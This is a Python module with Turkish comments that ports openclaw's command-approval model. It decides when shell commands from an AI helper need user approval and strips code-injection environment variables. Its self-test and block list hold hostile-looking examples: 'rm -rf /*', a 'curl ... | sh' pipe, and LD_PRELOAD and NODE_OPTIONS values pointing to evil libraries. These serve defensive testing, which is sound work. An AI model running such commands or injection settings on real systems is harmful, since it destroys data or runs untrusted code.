# exec_approvals.py
"""
Komut yürütme onay modeli (openclaw exec-approvals portu).

Bu modul, openclaw'un TypeScript `src/infra/exec-approvals.ts` +
`src/agents/bash-tools.exec.ts` guvenlik modelini Python'a tasir. Amac:
bir kabuk komutunun otomatik olarak calistirilabilir mi (allowed), yoksa
once kullanici onayi mi gerektirdigini (requires_approval) belirlemek.

Tasarim ilkeleri (openclaw ile ayni):
  - "allowlist" modunda yalnizca guvenli ikili dosyalar (safe bins) veya
    kullanicinin kalici olarak izin verdigi desenler onaysiz calisir.
  - Kabuk metakarakterleri (|, >, ;, $(...), backtick, && ...) iceren
    komutlar tek bir ikiliye indirgenemez; bu yuzden ASLA otomatik
    izin verilmez (openclaw blocklist bypass bug'inin cozumu).
  - Ana bilgisayarda kod enjeksiyonuna yol acabilecek ortam degiskenleri
    (LD_PRELOAD, DYLD_INSERT_LIBRARIES, PYTHONPATH ...) temizlenir.

Yalnizca standart kutuphane kullanir: os, json, shlex, re, pathlib, time.
"""

import os
import json
import shlex
import re
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# Sabitler (openclaw ile birebir)
# ---------------------------------------------------------------------------

# openclaw exec-approvals.ts satir 65
DEFAULT_SAFE_BINS = ["jq", "grep", "cut", "sort", "uniq", "head", "tail", "tr", "wc"]

# openclaw bash-tools.exec.ts satir 61-78: ana bilgisayarda calistirma sirasinda
# yasak ortam degiskenleri (kod enjeksiyonu / calisma akisi degisimi).
DANGEROUS_HOST_ENV_VARS = {
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "LD_AUDIT",
    "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH",
    "NODE_OPTIONS",
    "NODE_PATH",
    "PYTHONPATH",
    "PYTHONHOME",
    "RUBYLIB",
    "PERL5LIB",
    "BASH_ENV",
    "ENV",
    "GCONV_PATH",
    "IFS",
    "SSLKEYLOGFILE",
}

# openclaw bash-tools.exec.ts satir 79
DANGEROUS_HOST_ENV_PREFIXES = ("DYLD_", "LD_")

# Kalici allowlist / ayar dosyasi
APPROVALS_PATH = Path.home() / ".ai_helper" / "exec_approvals.json"

# Gecerli tip degerleri (dokumantasyon amacli; openclaw: ExecSecurity / ExecAsk)
EXEC_SECURITY_VALUES = ("deny", "allowlist", "full")
EXEC_ASK_VALUES = ("off", "on-miss", "always")


class ExecApprovals:
    """
    Komut yurutme onay motoru.

    security:
        "full"      -> her sey allowed, onay yok.
        "deny"      -> hicbir sey otomatik allowed degil; sadece kullanici onayiyla.
        "allowlist" -> (varsayilan) yalnizca safe_bins veya kalici allowlist
                       desenindeki komutlar onaysiz calisir.
    ask:
        "off"       -> hicbir zaman onay isteme (kacirilan komut sessizce reddedilir).
        "on-miss"   -> (varsayilan) allowlist'te olmayan komut icin onay iste.
        "always"    -> guvenli olsa bile her komut icin onay iste.
    """

    def __init__(self, security="allowlist", ask="on-miss", safe_bins=None, config_path=None):
        if security not in EXEC_SECURITY_VALUES:
            raise ValueError(f"gecersiz security: {security!r}, {EXEC_SECURITY_VALUES} bekleniyor")
        if ask not in EXEC_ASK_VALUES:
            raise ValueError(f"gecersiz ask: {ask!r}, {EXEC_ASK_VALUES} bekleniyor")

        self.security = security
        self.ask = ask
        # safe_bins None ise varsayilani kullan; bos liste [] verilirse gercekten bos.
        bins = DEFAULT_SAFE_BINS if safe_bins is None else safe_bins
        self.safe_bins = {b.strip().lower() for b in bins if b and b.strip()}
        self.config_path = Path(config_path) if config_path else APPROVALS_PATH
        # Kalici allowlist girdileri: list[dict] {pattern, added_at, last_used_at}
        self.entries = []
        self._load()

    # -- Kalici depolama -----------------------------------------------------

    def _load(self):
        """JSON'dan kalici allowlist'i yukle (yoksa/bozuksa bos baslar)."""
        try:
            if self.config_path.exists():
                data = json.loads(self.config_path.read_text(encoding="utf-8"))
                raw = data.get("allowlist", [])
                entries = []
                for item in raw:
                    if isinstance(item, str):
                        pattern = item.strip()
                        if pattern:
                            entries.append({"pattern": pattern, "added_at": None, "last_used_at": None})
                    elif isinstance(item, dict):
                        pattern = str(item.get("pattern", "")).strip()
                        if pattern:
                            entries.append({
                                "pattern": pattern,
                                "added_at": item.get("added_at"),
                                "last_used_at": item.get("last_used_at"),
                            })
                self.entries = entries
        except (OSError, ValueError, json.JSONDecodeError):
            # Bozuk dosya guvenligi bozmasin: bos allowlist ile devam et (fail closed).
            self.entries = []

    def _save(self):
        """Allowlist'i JSON'a atomik yaz."""
        self.config_path.parent.mkdir(parents=True, exist_ok=True)
        payload = {
            "version": 1,
            "security": self.security,
            "ask": self.ask,
            "allowlist": self.entries,
        }
        tmp = self.config_path.with_suffix(self.config_path.suffix + ".tmp")
        tmp.write_text(json.dumps(payload, indent=2, ensure_ascii=False), encoding="utf-8")
        os.replace(tmp, self.config_path)

    def _patterns(self):
        return [e["pattern"] for e in self.entries if e.get("pattern")]

    # -- Komut cozumleme -----------------------------------------------------

    def _has_shell_operators(self, command):
        """
        Komutta tirnak-disi kabuk metakarakteri var mi? (quote-aware)

        openclaw iterateQuoteAware mantiginin sadelestirilmis surumu:
        tek/cift tirnak ve kacis karakterlerini takip eder; tirnak disinda
        |, >, <, ;, &, newline gorurse veya $(...) / backtick gorurse True.
        Cift tirnak icinde de komut ikamesi ($(...) ve backtick) aktiftir.
        """
        in_single = False
        in_double = False
        escaped = False
        i = 0
        n = len(command)
        while i < n:
            ch = command[i]
            nxt = command[i + 1] if i + 1 < n else ""
            if escaped:
                escaped = False
                i += 1
                continue
            if not in_single and ch == "\\":
                escaped = True
                i += 1
                continue
            if in_single:
                if ch == "'":
                    in_single = False
                i += 1
                continue
            if in_double:
                if ch == "`":
                    return True
                if ch == "$" and nxt == "(":
                    return True
                if ch == '"':
                    in_double = False
                i += 1
                continue
            # tirnak disi
            if ch == "'":
                in_single = True
                i += 1
                continue
            if ch == '"':
                in_double = True
                i += 1
                continue
            if ch == "`":
                return True
            if ch == "$" and nxt == "(":
                return True
            if ch in "|;><&\n\r":
                return True
            i += 1
        return False

    def _analyze(self, command):
        """
        Komutu (binary, argv, is_shell) olarak coz.
        is_shell True ise komut tek ikiliye indirgenemez -> otomatik izin yasak.
        """
        command = command or ""
        is_shell = self._has_shell_operators(command)
        argv = []
        try:
            argv = shlex.split(command)
        except ValueError:
            # dengesiz tirnak vb. -> guvenli tarafta kal
            is_shell = True
            argv = []
        binary = argv[0] if argv else ""
        return binary, argv, is_shell

    # -- Guvenli ikili (safe bin) kontrolu -----------------------------------

    @staticmethod
    def _is_path_like(value):
        """openclaw isPathLikeToken: token bir dosya yolu mu?"""
        trimmed = value.strip()
        if not trimmed or trimmed == "-":
            return False
        if trimmed.startswith(("./", "../", "~", "/")):
            return True
        return bool(re.match(r"^[A-Za-z]:[\\/]", trimmed))

    @staticmethod
    def _file_exists(cwd, token):
        try:
            return (Path(cwd) / token).exists()
        except (OSError, ValueError):
            return False

    def _is_safe_bin_usage(self, binary, argv, cwd=None):
        """
        openclaw isSafeBinUsage: ikili safe_bins'te VE hicbir argumani bir
        dosya yolu / var olan dosya degil ise guvenli. Bu, `grep foo` gibi
        salt-desen kullanimini otomatik izin verirken `grep /etc/passwd`
        gibi dosyaya dokunan kullanimi onaya birakir.
        """
        if not self.safe_bins:
            return False
        exec_name = os.path.basename(binary).lower()
        if not exec_name or exec_name not in self.safe_bins:
            return False
        cwd = cwd or os.getcwd()
        for token in argv[1:]:
            if not token or token == "-":
                continue
            if token.startswith("-"):
                eq = token.find("=")
                if eq > 0:
                    value = token[eq + 1:]
                    if value and (self._is_path_like(value) or self._file_exists(cwd, value)):
                        return False
                continue
            if self._is_path_like(token):
                return False
            if self._file_exists(cwd, token):
                return False
        return True

    # -- Kalici allowlist eslesmesi ------------------------------------------

    @staticmethod
    def _glob_to_regex(pattern):
        """Basit glob (* ?) -> regex donusumu (fnmatch'siz, sadece re)."""
        out = ["^"]
        for ch in pattern:
            if ch == "*":
                out.append(".*")
            elif ch == "?":
                out.append(".")
            else:
                out.append(re.escape(ch))
        out.append("$")
        return re.compile("".join(out))

    @staticmethod
    def _expand_home(value):
        if value == "~":
            return str(Path.home())
        if value.startswith("~/"):
            return str(Path.home() / value[2:])
        return value

    def _resolve_executable(self, binary):
        """PATH uzerinde ikiliyi cozumle (openclaw resolveExecutablePath sadelestirmesi)."""
        if not binary:
            return None
        if os.path.sep in binary or (os.path.altsep and os.path.altsep in binary):
            expanded = self._expand_home(binary)
            return expanded if Path(expanded).exists() else None
        for directory in os.environ.get("PATH", "").split(os.pathsep):
            if not directory:
                continue
            candidate = Path(directory) / binary
            try:
                if candidate.exists() and os.access(candidate, os.X_OK):
                    return str(candidate)
            except OSError:
                continue
        return None

    def _matches_allowlist(self, binary):
        """
        Komutun ilk token'i (binary) kalici allowlist deseninde mi?

        Desen ya duz bir ikili adi ("ls") ya da bir yol/glob deseni
        ("/usr/bin/ls", "~/bin/*") olabilir. Yol/glob desenleri cozumlenen
        tam yola ve ikili adina karsi eslestirilir (openclaw matchAllowlist).
        """
        patterns = self._patterns()
        if not patterns or not binary:
            return False
        exec_name = os.path.basename(binary).lower()
        raw = binary.lower()
        resolved = self._resolve_executable(binary)
        for pattern in patterns:
            p = pattern.strip()
            if not p:
                continue
            pl = p.lower()
            # Duz ikili adi eslesmesi
            if pl == exec_name or pl == raw:
                return True
            # Yol / glob deseni eslesmesi
            if any(c in p for c in "/\\~*?"):
                regex = self._glob_to_regex(self._expand_home(p))
                targets = [binary, exec_name]
                if resolved:
                    targets.append(resolved)
                if any(regex.match(t) for t in targets):
                    return True
        return False

    # -- Kamu API ------------------------------------------------------------

    def evaluate(self, command):
        """
        Bir komutu degerlendir.

        Donus: dict
            allowed:           komut politikayi geciyor mu (onay sonrasi calisabilir mi)
            requires_approval: calismadan once kullanici onayi gerekli mi
            reason:            karar gerekcesi (kisa)
            binary:            komutun ilk token'i (bos = cozumlenemedi)
        """
        binary, argv, is_shell = self._analyze(command)

        # full: her sey allowed, onay yok
        if self.security == "full":
            return {
                "allowed": True,
                "requires_approval": False,
                "reason": "full security mode: all commands allowed",
                "binary": binary,
            }

        # deny: hicbir sey otomatik allowed degil, sadece kullanici onayiyla
        if self.security == "deny":
            return {
                "allowed": False,
                "requires_approval": self.ask != "off",
                "reason": "deny security mode: manual approval required",
                "binary": binary,
            }

        # allowlist (varsayilan)
        if is_shell:
            # Kabuk metakarakterleri -> tek ikiliye indirgenemez -> ASLA otomatik izin verme
            return {
                "allowed": False,
                "requires_approval": self.ask != "off",
                "reason": "shell metacharacters present; cannot auto-allow",
                "binary": binary,
            }

        if not binary:
            return {
                "allowed": False,
                "requires_approval": self.ask != "off",
                "reason": "empty or unparsable command",
                "binary": binary,
            }

        safe = self._is_safe_bin_usage(binary, argv)
        listed = self._matches_allowlist(binary)

        if safe or listed:
            reason = "safe binary" if safe else "matched persistent allowlist"
            if self.ask == "always":
                # ask=always: guvenli olsa bile onay iste
                return {
                    "allowed": True,
                    "requires_approval": True,
                    "reason": f"{reason}; ask=always forces approval",
                    "binary": binary,
                }
            return {
                "allowed": True,
                "requires_approval": False,
                "reason": reason,
                "binary": binary,
            }

        # Eslesme yok -> allowlist kacirmasi
        return {
            "allowed": False,
            "requires_approval": self.ask != "off",
            "reason": "not in safe bins or allowlist",
            "binary": binary,
        }

    def is_allowed(self, command):
        """Komut onaysiz calistirilabilir mi? (allowed ve onay gerektirmiyor)."""
        result = self.evaluate(command)
        return result["allowed"] and not result["requires_approval"]

    def add_allowlist_entry(self, pattern):
        """
        Kalici allowlist'e desen ekle ve diske yaz ("allow-always" davranisi).
        Zaten varsa yeniden eklemez. Eklendi mi bilgisini dondurur.
        """
        trimmed = (pattern or "").strip()
        if not trimmed:
            return False
        if any(e["pattern"] == trimmed for e in self.entries):
            return False
        self.entries.append({
            "pattern": trimmed,
            "added_at": time.time(),
            "last_used_at": None,
        })
        self._save()
        return True

    # -- Ortam degiskeni temizleme -------------------------------------------

    @staticmethod
    def _is_dangerous_env_key(key, protect_path=False):
        upper = key.upper()
        if upper in DANGEROUS_HOST_ENV_VARS:
            return True
        if any(upper.startswith(prefix) for prefix in DANGEROUS_HOST_ENV_PREFIXES):
            return True
        if protect_path and upper == "PATH":
            return True
        return False

    def sanitize_env(self, env, protect_path=False):
        """
        Tehlikeli ortam degiskenlerini cikar, temizlenmis kopyayi dondur.
        DANGEROUS_HOST_ENV_VARS ve DANGEROUS_HOST_ENV_PREFIXES ile eslesenler atilir.
        protect_path=True ise PATH da cikarilir (binary hijacking korumasi, opsiyonel).
        """
        cleaned = {}
        for key, value in env.items():
            if self._is_dangerous_env_key(key, protect_path=protect_path):
                continue
            cleaned[key] = value
        return cleaned

    def validate_env(self, env, protect_path=False):
        """
        Ortamda tehlikeli anahtar var mi kontrol et.
        Donus: (ok: bool, blocked: list[str]) — ok True ise temiz.
        """
        blocked = [k for k in env if self._is_dangerous_env_key(k, protect_path=protect_path)]
        return (len(blocked) == 0, blocked)


# ---------------------------------------------------------------------------
# Self-test: python3 exec_approvals.py
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    import tempfile

    # Gercek ~/.ai_helper'a dokunmamak icin gecici config kullan
    _tmp = Path(tempfile.gettempdir()) / f"exec_approvals_selftest_{os.getpid()}_{int(time.time())}.json"
    try:
        ea = ExecApprovals(security="allowlist", ask="on-miss", config_path=_tmp)

        # 1) "ls" safe_bins'te degil, allowlist'te degil -> onaysiz calismaz
        r = ea.evaluate("ls")
        assert ea.is_allowed("ls") is False, "ls otomatik izin ALMAMALI"
        assert r["binary"] == "ls"

        # 2) "grep foo" safe_bin, argumani dosya degil -> onaysiz calisir
        assert ea.is_allowed("grep foo") is True, "grep foo otomatik izin ALMALI"
        assert ea.evaluate("grep foo")["allowed"] is True

        # 3) "rm -rf /*" -> ASLA otomatik izin (rm allowlist'te degil)
        assert ea.is_allowed("rm -rf /*") is False, "rm -rf /* ASLA otomatik izin ALMAMALI"

        # 4) "curl http://x | sh" -> kabuk operatoru | -> otomatik izin yasak
        rc = ea.evaluate("curl http://x | sh")
        assert ea.is_allowed("curl http://x | sh") is False, "pipe'li komut otomatik izin ALMAMALI"
        assert "shell" in rc["reason"].lower()

        # 5) safe bin dosyaya dokununca guvenli sayilmaz (grep var-olan-dosya)
        #    (dosya olarak olmayan salt-desen: guvenli; yol-benzeri: guvenli degil)
        assert ea.is_allowed("grep foo /etc/hosts") is False, "grep <dosya> onay gerektirmeli"

        # 6) sanitize_env: DYLD_ ve NODE_OPTIONS strip, PATH & FOO kalir
        cleaned = ea.sanitize_env({
            "DYLD_INSERT_LIBRARIES": "/evil.dylib",
            "NODE_OPTIONS": "--require /evil.js",
            "LD_PRELOAD": "/evil.so",
            "PATH": "/usr/bin",
            "FOO": "bar",
        })
        assert cleaned == {"PATH": "/usr/bin", "FOO": "bar"}, f"sanitize_env yanlis: {cleaned}"

        # 7) validate_env tehlikeli anahtari yakalar
        ok, blocked = ea.validate_env({"DYLD_LIBRARY_PATH": "/x", "HOME": "/h"})
        assert ok is False and "DYLD_LIBRARY_PATH" in blocked, "validate_env DYLD yakalamali"
        ok2, blocked2 = ea.validate_env({"HOME": "/h", "USER": "berke"})
        assert ok2 is True and blocked2 == [], "temiz ortam ok olmali"

        # 8) add_allowlist_entry: "ls" ekle -> artik onaysiz calisir (allow-always)
        assert ea.add_allowlist_entry("ls") is True
        assert ea.is_allowed("ls") is True, "allowlist'e eklendikten sonra ls calismali"
        # kalicilik: yeni ornek ayni config'i okumali
        ea2 = ExecApprovals(security="allowlist", ask="on-miss", config_path=_tmp)
        assert ea2.is_allowed("ls") is True, "allowlist diskten yuklenmedi"

        # 9) full mode: her sey allowed
        ea_full = ExecApprovals(security="full", config_path=_tmp)
        assert ea_full.is_allowed("rm -rf /") is True, "full mode her seye izin vermeli"

        # 10) deny mode: hicbir sey otomatik allowed degil
        ea_deny = ExecApprovals(security="deny", config_path=_tmp)
        assert ea_deny.is_allowed("grep foo") is False, "deny mode otomatik izin vermemeli"
        assert ea_deny.evaluate("grep foo")["requires_approval"] is True

        # 11) ask=always: safe olsa bile onay iste
        ea_always = ExecApprovals(security="allowlist", ask="always", config_path=_tmp)
        assert ea_always.evaluate("grep foo")["requires_approval"] is True
        assert ea_always.is_allowed("grep foo") is False, "ask=always safe komutu bile onaya birakmali"

        print("OK: tum kritik guvenlik dogrulamalari gecti (11/11)")
    finally:
        try:
            _tmp.unlink()
        except OSError:
            pass
